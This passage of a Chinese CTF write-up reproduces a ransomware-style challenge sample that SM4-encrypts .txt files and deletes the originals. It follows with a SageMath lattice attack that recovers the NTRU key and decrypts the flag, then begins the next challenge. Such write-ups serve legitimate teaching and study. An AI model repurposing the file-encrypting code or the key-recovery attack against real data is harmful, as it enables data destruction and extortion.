d2</span>):</span><br><span class="line">    <span class="keyword">assert</span> N &gt;= d1 + d2</span><br><span class="line">    s = [<span class="number">1</span>] * d1 + [-<span class="number">1</span>] * d2 + [<span class="number">0</span>] * (N - d1 - d2)</span><br><span class="line">    shuffle(s)</span><br><span class="line">    <span class="keyword">return</span> R(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invert_mod_prime</span>(<span class="params">f, p</span>):</span><br><span class="line">    Rp = R.change_ring(Integers(p)).quotient(x^N - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> R(lift(<span class="number">1</span> / Rp(f)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convolution</span>(<span class="params">f, g</span>):</span><br><span class="line">    <span class="keyword">return</span> (f * g) % (x^N - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lift_mod</span>(<span class="params">f, q</span>):</span><br><span class="line">    <span class="keyword">return</span> R([((f[i] + q // <span class="number">2</span>) % q) - q // <span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poly_mod</span>(<span class="params">f, q</span>):</span><br><span class="line">    <span class="keyword">return</span> R([f[i] % q <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invert_mod_pow2</span>(<span class="params">f, q</span>):</span><br><span class="line">    <span class="keyword">assert</span> q.is_power_of(<span class="number">2</span>)</span><br><span class="line">    g = invert_mod_prime(f, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = lift_mod(convolution(g, f), q)</span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> g</span><br><span class="line">        g = lift_mod(convolution(g, <span class="number">2</span> - r), q)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_message</span>():</span><br><span class="line">    <span class="keyword">return</span> R([randrange(p) - <span class="number">1</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(N)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_key</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = generate_T(d + <span class="number">1</span>, d)</span><br><span class="line">            g = generate_T(d, d)</span><br><span class="line">            Fp = poly_mod(invert_mod_prime(f, p), p)</span><br><span class="line">            Fq = poly_mod(invert_mod_pow2(f, q), q)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    h = poly_mod(convolution(Fq, g), q)</span><br><span class="line">    <span class="keyword">return</span> h, (f, g)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_message</span>(<span class="params">m, h</span>):</span><br><span class="line">    e = lift_mod(p * convolution(h, generate_T(d, d)) + m, q)</span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_ntru_keys</span>():</span><br><span class="line">    h, secret = generate_key()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;pub_key.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="built_in">str</span>(h))</span><br><span class="line">    m = generate_message()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;priv_key.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="built_in">str</span>(m))</span><br><span class="line">    e = encrypt_message(m, h)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;enc.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">terms</span>(<span class="params">poly_str</span>):</span><br><span class="line">    terms = []</span><br><span class="line">    pattern = <span class="string">r&#x27;([+-]?\s*x\^?\d*|[-+]?\s*\d+)&#x27;</span></span><br><span class="line">    matches = re.finditer(pattern, poly_str.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> matches:</span><br><span class="line">        term = <span class="keyword">match</span>.group()</span><br><span class="line">        <span class="keyword">if</span> term == <span class="string">&#x27;+x&#x27;</span> <span class="keyword">or</span> term == <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">            terms.append(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> term == <span class="string">&#x27;-x&#x27;</span>:</span><br><span class="line">            terms.append(-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;x^&#x27;</span> <span class="keyword">in</span> term:</span><br><span class="line">            coeff_part = term.split(<span class="string">&#x27;x^&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            exponent = <span class="built_in">int</span>(term.split(<span class="string">&#x27;x^&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> coeff_part <span class="keyword">or</span> coeff_part == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">                coeff = <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> coeff_part == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">                coeff = -<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                coeff = <span class="built_in">int</span>(coeff_part)</span><br><span class="line">            terms.append(coeff * exponent)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">in</span> term:</span><br><span class="line">            coeff_part = term.split(<span class="string">&#x27;x&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> coeff_part <span class="keyword">or</span> coeff_part == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">                terms.append(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">elif</span> coeff_part == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">                terms.append(-<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                terms.append(<span class="built_in">int</span>(coeff_part))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> term == <span class="string">&#x27;+1&#x27;</span> <span class="keyword">or</span> term == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                terms.append(<span class="number">0</span>)</span><br><span class="line">                terms.append(-<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> terms</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>(<span class="params">poly_terms</span>):</span><br><span class="line">    binary = [<span class="number">0</span>] * <span class="number">128</span></span><br><span class="line">    <span class="keyword">for</span> term <span class="keyword">in</span> poly_terms:</span><br><span class="line">        exponent = <span class="built_in">abs</span>(term)</span><br><span class="line">        <span class="keyword">if</span> term &gt; <span class="number">0</span> <span class="keyword">and</span> exponent &lt;= <span class="number">127</span>:  </span><br><span class="line">            binary[<span class="number">127</span> - exponent] = <span class="number">1</span></span><br><span class="line">    binary_str = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, binary))</span><br><span class="line">    hex_key = <span class="built_in">hex</span>(<span class="built_in">int</span>(binary_str, <span class="number">2</span>))[<span class="number">2</span>:].upper().zfill(<span class="number">32</span>)</span><br><span class="line">    <span class="keyword">return</span> hex_key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_polynomial_from_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">return</span> file.read().strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sm4_encrypt</span>(<span class="params">key, plaintext</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(key) == <span class="number">16</span>, <span class="string">&quot;SM4 key must be 16 bytes&quot;</span></span><br><span class="line">    cipher = sm4.CryptSM4()</span><br><span class="line">    cipher.set_key(key, sm4.SM4_ENCRYPT)</span><br><span class="line">    padded_plaintext = pad(plaintext, <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> cipher.crypt_ecb(padded_plaintext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sm4_encrypt_file</span>(<span class="params">input_path, output_path, key</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        plaintext = f.read()</span><br><span class="line">    </span><br><span class="line">    ciphertext = sm4_encrypt(key, plaintext)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">resource_path</span>(<span class="params">relative_path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">getattr</span>(sys, <span class="string">&#x27;frozen&#x27;</span>, <span class="literal">False</span>):</span><br><span class="line">        base_path = sys._MEIPASS</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        base_path = os.path.abspath(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> os.path.join(base_path, relative_path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_directory</span>(<span class="params">directory, sm4_key, extensions=[<span class="string">&quot;.txt&quot;</span>]</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(directory):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Directory does not exist: <span class="subst">&#123;directory&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> root, _, files <span class="keyword">in</span> os.walk(directory):</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(file.endswith(ext) <span class="keyword">for</span> ext <span class="keyword">in</span> extensions):</span><br><span class="line">                input_path = os.path.join(root, file)</span><br><span class="line">                output_path = input_path + <span class="string">&quot;.enc&quot;</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    sm4_encrypt_file(input_path, output_path, sm4_key)</span><br><span class="line">                    os.remove(input_path)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;Encrypted: <span class="subst">&#123;input_path&#125;</span> -&gt; <span class="subst">&#123;output_path&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;Error encrypting <span class="subst">&#123;input_path&#125;</span>: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        save_ntru_keys()</span><br><span class="line">        poly_str = read_polynomial_from_file(<span class="string">&quot;priv_key.txt&quot;</span>)</span><br><span class="line">        poly_terms = terms(poly_str)</span><br><span class="line">        sm4_key = binascii.unhexlify(poly_terms)</span><br><span class="line">        user_name = os.getlogin()</span><br><span class="line">        target_dir = os.path.join(<span class="string">&quot;C:\Users&quot;</span>, user_name, <span class="string">&quot;Desktop&quot;</span>, <span class="string">&quot;test_files&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(target_dir):</span><br><span class="line">            os.makedirs(target_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Created directory: <span class="subst">&#123;target_dir&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">            </span><br><span class="line">        txt_files = [f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(target_dir) </span><br><span class="line">                    <span class="keyword">if</span> f.endswith(<span class="string">&#x27;.txt&#x27;</span>) <span class="keyword">and</span> os.path.isfile(os.path.join(target_dir, f))]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> txt_files:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;No .txt files found in directory&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">for</span> txt_file <span class="keyword">in</span> txt_files:</span><br><span class="line">            file_path = os.path.join(target_dir, txt_file)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    test_data = f.read()</span><br><span class="line">                </span><br><span class="line">                ciphertext = sm4_encrypt(sm4_key, test_data)</span><br><span class="line">                encrypted_path = file_path + <span class="string">&#x27;.enc&#x27;</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(encrypted_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(ciphertext)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Error processing <span class="subst">&#123;txt_file&#125;</span>: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">                </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Fatal error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>但是按理说这个应该是不能跑的，不知道是不是我解包有问题，<code>poly_terms = terms(poly_str)</code> 得到的是一个 list，按理说 <code>binascii.unhexlify()</code> 是不能传的，应该是少了个 <code>gen_key()</code> 的处理。</p>
<p>题目总体逻辑比较简单，但是命名非常混乱，<code>priv_key.txt</code> 并不是私钥，而是一个随机的多项式，然后这个多项式被 NTRU 加密了，注意到解包出来的还有公钥 <code>pub_key.txt</code>，和加密后的多项式 <code>enc.txt</code>。<br>用轮子搞个私钥出来：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">start = time.time()</span><br><span class="line">Zx.&lt;x&gt; = ZZ[]</span><br><span class="line">n = <span class="number">49</span></span><br><span class="line">q = <span class="number">128</span></span><br><span class="line">p = <span class="number">3</span></span><br><span class="line">h = <span class="number">8</span>*x^<span class="number">48</span> + <span class="number">58</span>*x^<span class="number">47</span> + <span class="number">18</span>*x^<span class="number">46</span> + <span class="number">61</span>*x^<span class="number">45</span> + <span class="number">33</span>*x^<span class="number">44</span> + <span class="number">21</span>*x^<span class="number">43</span> + <span class="number">58</span>*x^<span class="number">42</span> + <span class="number">21</span>*x^<span class="number">41</span> + <span class="number">5</span>*x^<span class="number">40</span> + <span class="number">32</span>*x^<span class="number">39</span> + <span class="number">15</span>*x^<span class="number">38</span> + <span class="number">40</span>*x^<span class="number">37</span> + <span class="number">24</span>*x^<span class="number">36</span> + <span class="number">14</span>*x^<span class="number">35</span> + <span class="number">40</span>*x^<span class="number">34</span> + <span class="number">5</span>*x^<span class="number">33</span> + x^<span class="number">32</span> + <span class="number">48</span>*x^<span class="number">31</span> + <span class="number">21</span>*x^<span class="number">30</span> + <span class="number">36</span>*x^<span class="number">29</span> + <span class="number">42</span>*x^<span class="number">28</span> + <span class="number">8</span>*x^<span class="number">27</span> + <span class="number">17</span>*x^<span class="number">26</span> + <span class="number">54</span>*x^<span class="number">25</span> + <span class="number">39</span>*x^<span class="number">24</span> + <span class="number">38</span>*x^<span class="number">23</span> + <span class="number">14</span>*x^<span class="number">22</span> + <span class="number">22</span>*x^<span class="number">21</span> + <span class="number">26</span>*x^<span class="number">20</span> + <span class="number">22</span>*x^<span class="number">18</span> + <span class="number">7</span>*x^<span class="number">17</span> + <span class="number">29</span>*x^<span class="number">16</span> + <span class="number">53</span>*x^<span class="number">15</span> + <span class="number">50</span>*x^<span class="number">14</span> + <span class="number">49</span>*x^<span class="number">13</span> + <span class="number">21</span>*x^<span class="number">12</span> + <span class="number">47</span>*x^<span class="number">11</span> + <span class="number">50</span>*x^<span class="number">10</span> + <span class="number">32</span>*x^<span class="number">9</span> + <span class="number">14</span>*x^<span class="number">8</span> + <span class="number">50</span>*x^<span class="number">7</span> + <span class="number">18</span>*x^<span class="number">6</span> + <span class="number">9</span>*x^<span class="number">5</span> + <span class="number">61</span>*x^<span class="number">4</span> + <span class="number">10</span>*x^<span class="number">3</span> + <span class="number">9</span>*x^<span class="number">2</span> + <span class="number">11</span>*x + <span class="number">47</span></span><br><span class="line">e = <span class="number">31</span>*x^<span class="number">48</span> - <span class="number">14</span>*x^<span class="number">47</span> + x^<span class="number">46</span> + <span class="number">8</span>*x^<span class="number">45</span> - <span class="number">9</span>*x^<span class="number">44</span> - <span class="number">18</span>*x^<span class="number">43</span> - <span class="number">30</span>*x^<span class="number">41</span> + <span class="number">14</span>*x^<span class="number">40</span> + <span class="number">3</span>*x^<span class="number">39</span> - <span class="number">17</span>*x^<span class="number">38</span> + <span class="number">22</span>*x^<span class="number">37</span> + <span class="number">7</span>*x^<span class="number">36</span> + <span class="number">31</span>*x^<span class="number">34</span> - <span class="number">30</span>*x^<span class="number">33</span> - <span class="number">22</span>*x^<span class="number">32</span> - <span class="number">25</span>*x^<span class="number">31</span> + <span class="number">31</span>*x^<span class="number">30</span> - <span class="number">28</span>*x^<span class="number">29</span> + <span class="number">7</span>*x^<span class="number">28</span> + <span class="number">23</span>*x^<span class="number">27</span> - <span class="number">6</span>*x^<span class="number">26</span> + <span class="number">12</span>*x^<span class="number">25</span> - <span class="number">6</span>*x^<span class="number">24</span> + <span class="number">5</span>*x^<span class="number">23</span> - <span class="number">13</span>*x^<span class="number">22</span> - <span class="number">10</span>*x^<span class="number">20</span> + <span class="number">4</span>*x^<span class="number">19</span> + <span class="number">15</span>*x^<span class="number">18</span> + <span class="number">23</span>*x^<span class="number">17</span> + <span class="number">24</span>*x^<span class="number">16</span> - <span class="number">2</span>*x^<span class="number">15</span> - <span class="number">8</span>*x^<span class="number">14</span> - <span class="number">20</span>*x^<span class="number">13</span> + <span class="number">24</span>*x^<span class="number">12</span> - <span class="number">23</span>*x^<span class="number">11</span> - <span class="number">4</span>*x^<span class="number">10</span> - <span class="number">26</span>*x^<span class="number">9</span> - <span class="number">14</span>*x^<span class="number">8</span> + <span class="number">10</span>*x^<span class="number">7</span> + <span class="number">4</span>*x^<span class="number">6</span> - <span class="number">4</span>*x^<span class="number">5</span> - <span class="number">32</span>*x^<span class="number">4</span> - <span class="number">5</span>*x^<span class="number">3</span> - <span class="number">31</span>*x^<span class="number">2</span> + <span class="number">16</span>*x + <span class="number">11</span></span><br><span class="line">-x^<span class="number">48</span> - x^<span class="number">46</span> + x^<span class="number">45</span> + x^<span class="number">43</span> - x^<span class="number">42</span> + x^<span class="number">41</span> + x^<span class="number">40</span> + x^<span class="number">36</span> - x^<span class="number">35</span> + x^<span class="number">34</span> - x^<span class="number">33</span> + x^<span class="number">32</span> - x^<span class="number">30</span> + x^<span class="number">29</span> - x^<span class="number">28</span> - x^<span class="number">27</span> - x^<span class="number">26</span> - x^<span class="number">25</span> - x^<span class="number">23</span> - x^<span class="number">22</span> + x^<span class="number">21</span> + x^<span class="number">20</span> + x^<span class="number">19</span> + x^<span class="number">18</span> - x^<span class="number">17</span> - x^<span class="number">16</span> - x^<span class="number">15</span> - x^<span class="number">14</span> - x^<span class="number">12</span> + x^<span class="number">9</span> - x^<span class="number">7</span> - x^<span class="number">6</span> - x^<span class="number">5</span> - x^<span class="number">4</span> + x^<span class="number">3</span> - x + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">f,g</span>):</span><br><span class="line">    <span class="keyword">return</span> (f * g) % (x^n-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">pri_key,e</span>):</span><br><span class="line">    f,fp = pri_key</span><br><span class="line">    a = bal_mod(mul(f,e),q)</span><br><span class="line">    b = bal_mod(mul(a,fp),p)</span><br><span class="line">    <span class="built_in">print</span>(b)</span><br><span class="line">    pt = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> b.<span class="built_in">list</span>()])</span><br><span class="line">    <span class="keyword">return</span> pt</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bal_mod</span>(<span class="params">f,q</span>):</span><br><span class="line">    g = <span class="built_in">list</span>(((f[i] + q//<span class="number">2</span>) % q) - q//<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n))</span><br><span class="line">    <span class="keyword">return</span> Zx(g)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lattice</span>(<span class="params">h,q</span>):</span><br><span class="line">    n = <span class="number">49</span></span><br><span class="line">    <span class="comment"># h = bal_mod(683*h,q)</span></span><br><span class="line">    grid = Matrix(ZZ,<span class="number">2</span>*n,<span class="number">2</span>*n)</span><br><span class="line">    cof = h.<span class="built_in">list</span>()</span><br><span class="line">    offset = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>*n):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>*n):</span><br><span class="line">            <span class="keyword">if</span> i&lt;n:</span><br><span class="line">                <span class="keyword">if</span> j &lt; n:</span><br><span class="line">                    <span class="keyword">if</span> i==j:</span><br><span class="line">                        grid[i,j] = <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    grid[i,j] = cof[(j-n-offset)%n]</span><br><span class="line">            <span class="keyword">elif</span> j&gt;=n <span class="keyword">and</span> i==j:</span><br><span class="line">                grid[i,j] = q</span><br><span class="line">        offset += <span class="number">1</span></span><br><span class="line">    GL = grid.BKZ()</span><br><span class="line">    <span class="keyword">return</span> GL,grid</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_mod_prime</span>(<span class="params">f,p</span>):</span><br><span class="line">    T = Zx.change_ring(Integers(p)).quotient(x^n-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> Zx(lift(<span class="number">1</span> / T(f)))</span><br><span class="line"></span><br><span class="line">GL,grid = lattice(h,q)</span><br><span class="line">SVP = <span class="built_in">list</span>(GL[<span class="number">0</span>])</span><br><span class="line">f = Zx(SVP[:n])</span><br><span class="line">g = Zx(SVP[-n:])</span><br><span class="line">a = bal_mod(mul(f,e),q)</span><br><span class="line">fp = inv_mod_prime(f,p)</span><br><span class="line">pv = (f,fp)</span><br><span class="line"></span><br><span class="line">decrypt(pv,e)</span><br></pre></td></tr></table></figure>

<p>然后存到 <code>priv_key.txt</code> 里，把 <code>main()</code> 函数改成</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">poly_str = read_polynomial_from_file(<span class="string">&quot;priv_key_1.txt&quot;</span>)</span><br><span class="line">poly_terms = terms(poly_str)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Polynomial Terms: <span class="subst">&#123;poly_terms&#125;</span>&quot;</span>)</span><br><span class="line">key = gen_key(poly_terms)</span><br><span class="line">sm4_key = binascii.unhexlify(key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;SM4 Key: <span class="subst">&#123;sm4_key.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">enc = <span class="string">&quot;bf0cb5cc6bea6146e9c1f109df953a57daa416d38a8ffba6438e7e599613e01f3b9a53dace4ccd55cd3e55ef88e0b835&quot;</span></span><br><span class="line">enc = <span class="built_in">bytes</span>.fromhex(enc)</span><br><span class="line">dec = sm4_decrypt(sm4_key, enc)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Decrypted: <span class="subst">&#123;dec&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>得到 flag：<code>XYCTF&#123;Crypto0_can_n0t_So1ve_it&#125;</code></p>
<h3 id="Division"><a href="#Division" class="headerlink" title="Division"></a>Division</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   server.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/20 12:25:03</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;----Welcome to my division calc----&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">menu:</span></span><br><span class="line"><span class="string">      [1]  Division calc</span></span><br><span class="line"><span class="string">      [2]  Get flag</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    choose = <span class="built_in">input</span>(<span class="string">&#x27;: &gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> choose == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            denominator = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;input the denominator: &gt;&gt;&gt; &#x27;</span>))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;INPUT NUMBERS&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        nominator = random.getrandbits(<span 